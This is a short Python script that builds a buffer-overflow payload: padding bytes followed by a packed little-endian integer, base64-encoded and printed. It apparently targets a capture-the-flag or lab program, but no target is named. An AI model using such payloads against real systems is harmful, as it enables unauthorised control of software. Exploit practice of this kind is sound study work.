
import sys
import struct
import base64

buf = b'fffffffffffffffffffffffffffffffffffffffff'
buf += struct.pack('<I', 1324341785)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
